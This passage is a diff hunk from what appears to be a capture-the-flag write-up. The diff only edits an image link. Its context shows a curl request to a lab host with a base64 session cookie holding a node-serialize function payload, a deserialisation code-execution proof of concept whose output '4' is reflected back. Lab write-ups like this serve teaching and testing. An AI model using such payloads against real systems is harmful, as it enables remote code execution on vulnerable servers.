@@ -138,7 +138,7 @@ And set up our `curl`-command (copied from Firefox dev tools):
 $ curl 'http://10.10.171.154/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: nb-NO,nb;q=0.9,no-NO;q=0.8,no;q=0.6,nn-NO;q=0.5,nn;q=0.4,en-US;q=0.3,en;q=0.1' --compressed -H 'Connection: keep-alive' -H 'Cookie: session=eyJlbWFpbCI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKSB7IHJldHVybiAyKzI7IH0oKSJ9Cg==' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache'
 ```
 
-![](00-PoC.png "")
+![](00-PoC.png)
 
 > We'll keep you updated at: 4
 
